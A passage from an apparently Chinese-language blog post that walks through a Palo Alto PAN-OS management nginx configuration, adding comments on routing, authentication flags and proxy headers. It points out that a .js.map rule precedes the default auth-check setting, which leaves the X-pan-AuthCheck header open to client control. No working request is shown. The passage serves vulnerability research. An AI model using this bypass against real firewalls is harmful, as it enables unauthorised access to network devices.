class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 允许的请求方法</span><br>add_header Allow <span class="hljs-string">&quot;GET, HEAD, POST, PUT, DELETE, OPTIONS&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_method</span> !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) &#123;<br>  <span class="hljs-built_in">return</span> 405;<br>&#125;<br><br><span class="hljs-comment"># rewrite_log on;</span><br><br><span class="hljs-comment"># static ones</span><br><span class="hljs-comment"># 统计</span><br>location /nginx_status &#123;<br>  stub_status on;<br>  access_log off;<br>  allow 127.0.0.1;<br>  deny all;<br>&#125;<br><br><span class="hljs-comment"># Chrome cache large source map making them out of date.</span><br><span class="hljs-comment"># 解决 Chrome 缓存大型 source map 文件导致它们过时的问题</span><br>location ~ \.js\.map$ &#123;<br>  add_header Cache-Control <span class="hljs-string">&quot;no-cache; no-store&quot;</span>;<span class="hljs-comment"># 不缓存不存储</span><br>  proxy_pass_header Authorization;<span class="hljs-comment"># 是将客户端请求中的 Authorization 头传递给上游服务器，Authorization nginx 是默认会过滤掉的，所以需要显式的设置传输到上游服务器</span><br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<span class="hljs-comment"># 传输给上游服务</span><br>&#125;<br><br><span class="hljs-comment"># turn on auth check by default</span><br><span class="hljs-comment"># 默认设置 </span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>;<br><br><span class="hljs-comment"># unauth 的时候不检查认证</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> ~ ^\/unauth\/.+$) &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> = /php/logout.php) &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment"># new login rules</span><br><span class="hljs-comment"># 匹配登录的静态文件 images js</span><br>location ~ ^/login/(images|js)/ &#123;<br>  <span class="hljs-comment"># 重写: /login/(images|js)/(.*)$ =&gt; /$1/login/$2</span><br>  <span class="hljs-comment"># $1 (images|js), $2 (.*)</span><br>  rewrite /login/(images|js)/(.*)$ /<span class="hljs-variable">$1</span>/login/<span class="hljs-variable">$2</span> <span class="hljs-built_in">break</span>;<br>  <span class="hljs-comment"># 静态资源根目录</span><br>  root /var/appweb/htdocs;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>&#125;<br><br>location ~ ^/login/(css|fonts)/ &#123;<br>  root /var/appweb/htdocs/styles/;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>&#125;<br><br>location /php/login.php &#123;<br>  client_max_body_size 1k;<br>  limit_req zone=unauthRateLimit burst=10;<br>  <span class="hljs-comment"># 登录的时候也是关闭认证</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br><br>  proxy_set_header X-Client-Cert <span class="hljs-variable">$ssl_client_escaped_cert</span>;<br>  <span class="hljs-comment"># 包含默认的配置（ 请求头的配置 ）</span><br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># SAML related</span><br>location /SAML20/SP/ACS &#123;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>  proxy_intercept_errors on;<br>  rewrite /SAML20/SP/ACS /unauth/php/DualLogin.php <span class="hljs-built_in">break</span>;<br>  proxy_set_header X-ORIG-URI /SAML20/SP/ACS;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><br><span class="hljs-comment"># not allow json, lock, conf file access</span><br>location ~ ^/(vendor|python)([^\/]*)/(.*).(json|lock|conf)$ &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br><br><span class="hljs-comment"># redirect `/upload/xxx` to panPhpModule</span><br><span class="hljs-comment"># upload 交给 @upload_regular 处理</span><br>location /upload/ &#123;<br>  error_page 402 =200 @upload_regular;<br>  <span class="hljs-built_in">return</span> 402;<br>&#125;<br><br><span class="hljs-comment"># block unauthorized `/upload` access</span><br><span class="hljs-comment"># this prevents hacker dumping files to the system to fill up disk space.</span><br><span class="hljs-comment"># 不允许 upload 的访问</span><br>location /upload &#123;<br>  <span class="hljs-built_in">return</span> 403;<br>&#125;<br><br><span class="hljs-comment"># plugins not going through proxy and backend</span><br>location ~ ^/plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/ &#123;<br>  rewrite /plugins/([^\/]*)/ui/(js|styles|generated|VMSeries_Help|<span class="hljs-built_in">help</span>)/(.*)$<br>  /installed/<span class="hljs-variable">$1</span>/ui/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span><br>  <span class="hljs-built_in">break</span>;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>  root /opt/plugins;<br>&#125;<br><br>location /webui/ &#123;<br>  proxy_http_version 1.1;<br>  <span class="hljs-comment"># ^/webui(\/.*)$ =》 /php-packages/firewall_webui/php/api/index.php$1</span><br>  <span class="hljs-comment"># /webui/abc =&gt; /php-packages/firewall_webui/php/api/index.php/abc</span><br>  rewrite ^/webui(\/.*)$ /php-packages/firewall_webui/php/api/index.php<span class="hljs-variable">$1</span> <span class="hljs-built_in">break</span>;<br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-comment"># if ($content_type ~* &quot;multipart/form-data&quot;) &#123;</span><br>  <span class="hljs-comment">#   error_page 402 =200 @upload_api;</span><br>  <span class="hljs-comment"># &#125;</span><br><br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass_header token;<br>  proxy_pass_header tid;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><span class="hljs-comment"># index.php 同样是关闭认证</span><br>location /api/index.php &#123;<br>  proxy_http_version 1.1;<br>  proxy_set_header Connection <span class="hljs-string">&quot;Close&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br>  <span class="hljs-comment"># $args 是原始请求</span><br>  <span class="hljs-comment"># 这里会匹配有 password=的把其中的密码进行替换做加密处理, 这样就不会在日志中泄露了</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$args</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=REST_API_TOKEN=)REST_API_TOKEN=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1REST_API_TOKEN</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-comment"># 原始请求的处理</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$request</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=REST_API_TOKEN=)REST_API_TOKEN=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1REST_API_TOKEN</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-comment"># rewrite below will add `index.php` to $uri.</span><br>  <span class="hljs-comment"># capture the original uri before that happens,</span><br>  <span class="hljs-comment"># for api_metric logging.</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$orig_uri</span> <span class="hljs-variable">$uri</span>;<br><br>  access_log /var/log/nginx/access.log stripped;<br>  access_log /var/log/nginx/api_metrics.log stripped_metric;<br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$content_type</span> ~* <span class="hljs-string">&quot;multipart/form-data&quot;</span>) &#123;<br>    error_page 402 =200 @upload_api;<br>    <span class="hljs-built_in">return</span> 402;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$devonly</span> = 1) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-variable">$server_port</span>;<br>  &#125;<br><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><br>location /api &#123;<br>  <span class="hljs-comment"># do not know why &quot;last&quot; is needed and &quot;break&quot; does not work for api browser</span><br>  rewrite ^(/api)(\/?)$ <span class="hljs-variable">$1</span>/index.php last;<br>  rewrite ^(/api)(\/.*)$ <span class="hljs-variable">$1</span>/index.php<span class="hljs-variable">$2</span> last;<br>&#125;<br><br>location /restapi/ &#123;<br>  proxy_http_version 1.1;<br>  proxy_set_header Connection <span class="hljs-string">&quot;Close&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span>;<br><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$args</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_args</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_args</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$request</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=password=)password=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1password</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obfuscated_request</span> ~ (?i)(.*)(?=key=)key=[^&amp;]*(.*)) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$obfuscated_request</span> <span class="hljs-variable">$1key</span>=****<span class="hljs-variable">$2</span>;<br>  &#125;<br><br>  <span class="hljs-comment"># rewrite below will add `index.php` to $uri.</span><br>  <span class="hljs-comment"># capture the original uri before that happens,</span><br>  <span class="hljs-comment"># for api_metric logging.</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$orig_uri</span> <span class="hljs-variable">$uri</span>;<br><br>  rewrite ^/restapi(\/.*)$ /php/restapi/index.php<span class="hljs-variable">$1</span> <span class="hljs-built_in">break</span>;<br><br>  access_log /var/log/nginx/access.log obfus_access;<br>  access_log /var/log/nginx/restapi_metrics.log api_metric;<br><br>  <span class="hljs-comment"># `wget` POST does not work.</span><br>  <span class="hljs-comment"># If not regression, this will be removed</span><br>  <span class="hljs-comment"># if ($arg_client = &#x27;wget&#x27;) &#123;</span><br>  <span class="hljs-comment">#   error_page 402 =200 @api_wget_file; return 402;</span><br>  <span class="hljs-comment">#   set $isWgetLoad &quot;w&quot;;</span><br>  <span class="hljs-comment"># &#125;</span><br>  <span class="hljs-comment"># if ($arg_file-name) &#123;</span><br>  <span class="hljs-comment">#   set $isWgetLoad &quot;$&#123;isWgetLoad&#125;f&quot;;</span><br>  <span class="hljs-comment"># &#125;</span><br><br>  <span class="hljs-comment"># look for upload</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$content_type</span> ~* <span class="hljs-string">&quot;multipart/form-data&quot;</span>) &#123;<br>    error_page 402 =200 @upload_api;<br>    <span class="hljs-built_in">return</span> 402;<br>  &#125;<br><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># route `/restapi-doc` to `/restapi-doc/` as `DirectorySlash off` in httpd</span><br>location = /restapi-doc &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$args</span>) &#123;<br>    <span class="hljs-built_in">return</span> 302 /restapi-doc/?<span class="hljs-variable">$args</span>;<br>  &#125;<br>  <span class="hljs-built_in">return</span> 302 /restapi-doc/;<br>&#125;<br><br><span class="hljs-comment"># It is added to prevent restapi-doc page using default config</span><br>location /restapi-doc/ &#123;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>&#125;<br><br><span class="hljs-comment"># location @api_wget_file &#123;</span><br><span class="hljs-comment">#     client_body_in_file_only on;</span><br><span class="hljs-comment">#     proxy_set_header X-API-WGET-FILTER-FILE-PATH $request_body_file;</span><br><span class="hljs-comment"># &#125;</span><br><br>location @upload_api &#123;<br>  upload_pass @back_upload_api;<br>  include conf/upload_default.conf;<br>&#125;<br><br>location @back_upload_api &#123;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br>location @upload_regular &#123;<br>  upload_pass @back_upload_regular;<br>  include conf/upload_default.conf;<br>&#125;<br><br>location @back_upload_regular &#123;<br>  proxy_intercept_errors on;<br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br><span class="hljs-comment"># Custom error response pages</span><br>error_page 400 /error_page/400.html;<br>error_page 495 /error_page/400.html;<br>error_page 496 /error_page/400.html;<br>error_page 497 /error_page/400.html;<br>error_page 403 /error_page/403.html;<br>error_page 404 /error_page/404.html;<br>error_page 500 /error_page/500.html;<br>error_page 501 /error_page/501.html;<br>error_page 502 /error_page/502.html;<br>error_page 503 /error_page/503.html;<br>error_page 504 /error_page/504.html;<br><br>location /error_page/ &#123;<br>  root /var/appweb/htdocs;<br>  <span class="hljs-comment"># It is directly retrieving static files, we can not do proxy_hide_header, instead should just use add_header</span><br>  add_header Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>  add_header Cache-Control <span class="hljs-string">&quot;max-age=86400&quot;</span>;<br>  add_header Strict-Transport-Security <span class="hljs-string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;<br>  internal;<span class="hljs-comment"># 只有通过内部重定向（如 rewrite 或 error_page）才能访问这个路径，而不能直接从外部（客户端）访问。</span><br>&#125;<br><br><span class="hljs-comment"># not allow internal page access</span><br>location /phpincludes &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br>location /php/include &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br>location /lib/worldmap &#123;<br>  <span class="hljs-built_in">return</span> 404;<br>&#125;<br><br><span class="hljs-comment"># default catch all</span><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$addXframe</span> 0;<br><br><span class="hljs-comment"># route `/debug` to `/debug/` as `DirectorySlash off` in httpd</span><br>location = /debug &#123;<br>  <span class="hljs-built_in">return</span> 302 /debug/;<br>&#125;<br><br>location / &#123;<br>  <span class="hljs-comment"># intercept errors is turned on only for GUI pages,</span><br>  <span class="hljs-comment"># so that they are directed to the proper error pages.</span><br>  proxy_intercept_errors on;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$devonly</span> = 1) &#123;<br>    <span class="hljs-built_in">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-variable">$server_port</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$uri</span> = /) &#123;<br>    add_header X-Frame-Options <span class="hljs-string">&quot;DENY&quot;</span>;<br>    add_header X-XSS-Protection <span class="hljs-string">&#x27;1; mode=block;&#x27;</span>;<br>    add_header X-Content-Type-Options <span class="hljs-string">&#x27;nosniff&#x27;</span>;<br>    add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>  &#125;<br>  include conf/proxy_default.conf;<br>  proxy_pass_header Authorization;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>  proxy_cookie_path / <span class="hljs-string">&quot;/; HttpOnly; SameSite=Strict&quot;</span>;<br>&#125;<br><br><span class="hljs-comment"># sample: /wf_report/public|private/...whatever goes to Wildfire</span><br><span class="hljs-comment"># /wf_report/private/wildfire.paloaltonetworks.com/443/xxx/api/1.0/box/VERSION HTTP/1.0</span><br><span class="hljs-comment">#</span><br>location ~ ^/wf_report/([^\/]*)/([^\/]*)/([^\/]*)/(xxx/)?(.*)$ &#123;<br>  proxy_intercept_errors on;<br>  default_type text/plain;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_method</span> = OPTIONS) &#123;<br>    add_header Content-Length 0;<br>    add_header Access-Control-Allow-Origin <span class="hljs-string">&quot;null&quot;</span>;<br>    add_header Access-Control-Allow-Methods <span class="hljs-string">&quot;POST,GET,OPTIONS&quot;</span>;<br>    add_header Access-Control-Allow-Headers <span class="hljs-string">&quot;x-requested-with&quot;</span>;<br>    add_header Access-Control-Allow-Credentials <span class="hljs-string">&quot;true&quot;</span>;<br>    add_header Access-Control-Max-Age 30;<br>    add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>    <span class="hljs-built_in">return</span> 200;<br>  &#125;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$wftype</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myproxy</span> <span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myport</span> <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span>;<br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$myuri</span> <span class="hljs-string">&quot;<span class="hljs-variable">$5</span>&quot;</span>;<br><br>  rewrite <span class="hljs-string">&quot;^/wf_report/(.*)$&quot;</span> /php/monitor/wfAuthorize.php/<span class="hljs-variable">$myuri</span> <span class="hljs-built_in">break</span>;<br><br>  <span class="hljs-comment"># -------------------------</span><br>  proxy_set_header X-Wf-Server <span class="hljs-variable">$myproxy</span>;<br>  proxy_set_header X-Wf-Server-Port <span class="hljs-variable">$myport</span>;<br>  proxy_set_header X-Wf-Server-Type <span class="hljs-variable">$wftype</span>;<br>  <span class="hljs-comment"># -------------------------</span><br>  include conf/proxy_default.conf;<br>  proxy_pass http://$gohost<span class="hljs-variable">$gohostExt</span>;<br><br>  add_header Access-Control-Allow-Origin <span class="hljs-string">&quot;null&quot;</span>;<br>  add_header Access-Control-Allow-Methods <span class="hljs-string">&quot;POST,GET&quot;</span>;<br>  add_header Access-Control-Allow-Headers <span class="hljs-string">&quot;x-requested-with&quot;</span>;<br>  add_header Access-Control-Allow-Credentials <span class="hljs-string">&quot;true&quot;</span>;<br>  add_header Access-Control-Max-Age 30;<br>  add_header Strict-Transport-Security <span class="hljs-string">&#x27;max-age=31536000&#x27;</span>;<br>  <span class="hljs-comment"># Remove Last-modified from proxy header</span><br>  proxy_hide_header Last-Modified;<br>&#125;<br><br>location ~ ^/php/monitor/(wfAuthorize|wfProxy).php &#123;<br>  internal;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>nginx 默认过滤请求头，所以是需要显式的设置，其他的也就会默认的传输：</p><p><img src="/../../images/image-20250518001035357.png" alt="image-20250518001035357"></p><p><img src="/../../images/image-20250518001021340.png" alt="image-20250518001021340"></p><p>conf&#x2F;proxy_default.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># default proxy request header setting</span><br><span class="hljs-comment"># 设置了一些请求头, 不过必须包含才会起作用, 所以可以看到匹配的规则中设置 $panAuthCheck 了都要包含一下</span><br><span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Scheme <span class="hljs-variable">$scheme</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Port <span class="hljs-variable">$server_port</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Real-Server-IP <span class="hljs-variable">$server_addr</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For  <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-pan-ndpp-mode <span class="hljs-variable">$pan_ndpp_mode</span>;<br><span class="hljs-attribute">proxy_set_header</span> Proxy <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-attribute">proxy_set_header</span> X-pan-AuthCheck <span class="hljs-variable">$panAuthCheck</span>;<br></code></pre></td></tr></table></figure><p>nginx 解析规则：</p><p><img src="/../../images/840264-20221209221453931-440698749.png" alt="img"></p><p>学习到了 nginx 的很多知识</p><p>而且从上图中也知道了，nginx 中配置的规则就是匹配到了就走这条后面的就不处理了。</p><p>整理一下匹配的规则（ 按顺序 ）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">/nginx_status：127.0.0.1<br>~ \.js\.map$ ：整体上是为了处理缓存，不过在 <span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>; 之前就导致了X-pan-AuthCheck可以被自定义<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;on&#x27;</span>; 配置默认启用认证检测<br>^\/unauth\/.+$ 无需认证<br>/php/logout.php 无需认证<br>^/login/(images|js)/  login 的静态资源访问，重写规则<br>^/login/(css|fonts)/ 静态资源 /var/appweb/htdocs/styles/<br>/php/login.php <span class="hljs-variable">$panAuthCheck</span> <span class="hljs-string">&#x27;off&#x27;</span> =&gt; conf/proxy_default.conf =&gt; 转到上游服务<br>/SAML20/SP/ACS off /unauth/php/DualLogin.php X-ORIG-URI 